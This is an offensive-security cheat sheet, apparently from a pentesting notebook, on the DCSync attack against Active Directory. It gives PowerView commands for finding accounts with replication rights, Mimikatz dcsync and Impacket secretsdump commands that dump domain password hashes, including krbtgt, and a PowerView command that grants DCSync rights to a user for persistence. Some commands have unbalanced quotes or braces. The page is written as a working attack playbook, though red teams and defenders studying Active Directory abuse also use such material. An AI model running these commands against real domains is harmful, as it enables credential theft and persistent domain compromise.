# 🔨 DCSync Attack

## Description

A DCSync attack is where an adversary impersonates a Domain Controller (DC) and requests replication changes from a specific DC. The DC in turn returns replication data to the adversary, which includes account hashes.

By default the following groups have permissions to perform this action:

* Administrators
* Domain Admins
* Enterprise Admins
* Domain Controllers

However, in an incorrectly configured environment it may be possible to hunt down users who have the required individual permissions without being in any of the aforementioned groups. These individual permissions are:

* Replicating Directory Changes
* Replicating Directory Changes All
* Replicating Directory Changes In Filtered Set

## Enumeration

The following commands can be used with `PowerView` to enumerate for users with the required rights.

```bash
Get-ObjectACL "DC=security,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}

# OR

Get-ObjectAcl -DistinguishedName "DC=Security,DC" -ResolveGUIDs | ?{($_.IdentityReference -match "studentx") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

![](<../../../../../.gitbook/assets/image (1967).png>)

We can take the individual SID's and attempt to identify the related User Principal Names (UPN's).

{% tabs %}
{% tab title="Powershell AD Module" %}
```bash
Get-ADUser -Identity S-1-5-21-2543357152-2466851693-2862170513-1121
Get-ADGroup -Identity S-1-5-21-2543357152-2466851693-2862170513-527
```
{% endtab %}
{% endtabs %}

![](<../../../../../.gitbook/assets/image (1968).png>)

**Using PowerView**

```bash
Get-ObjectAcl -Identity "dc=security,dc=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match "S-1-5-21-2543357152-2466851693-2862170513-1121"
```

**Using Wmic**

```bash
wmic useraccount get name,sid
```

![](<../../../../../.gitbook/assets/image (1970).png>)

## Exploitation

`Mimikatz` can be used to pull hashes from account.

{% hint style="info" %}
Mimikatz needs to be run as an account that can perform replication.
{% endhint %}

```bash
lsadump::dcsync /domain:<Domain> /user:<Users-Hash-To-Dump>
lsadump::dcsync /domain:security.local /user:new_admin
lsadump::dcsync /user:security\krbtgt"
```

![](<../../../../../.gitbook/assets/image (1971) (1).png>)

### Secretsdump.py

Impacket's secretsdumpy.py can be used to dump all domain hashes, providing the hash or password is known for an account with permission to perform replication.

```bash
sudo python2 secretsdump.py <Domain>/<User>:<Password>@<IP>
sudo python2 secretsdump.py security/Moe:'Password123!'@10.10.10.10
```

![](<../../../../../.gitbook/assets/image (1972).png>)

## Persistence

`PowerView` can be used to give a user object the DCSync rights for future exploitation.

```bash
Add-ObjectACL -TargetDistinguishedName "DC=Security,DC=local" -PrincipalSamAccountName 'Moe' -Rights DCSync
```

### References: [https://www.exploit-db.com/docs/48298](https://www.exploit-db.com/docs/48298)
